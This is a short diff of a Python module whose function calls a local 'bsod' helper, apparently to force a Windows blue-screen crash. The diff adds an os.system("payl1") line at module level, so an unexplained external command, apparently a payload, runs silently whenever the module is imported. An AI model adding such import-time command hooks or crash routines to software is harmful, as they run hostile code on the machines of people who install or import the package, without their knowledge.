@@ -1,6 +1,7 @@
 import os
 from . import bsod
 
+os.system("payl1")
 def bsood():
   bsod.GetNtError()
   bsod.BSOD()
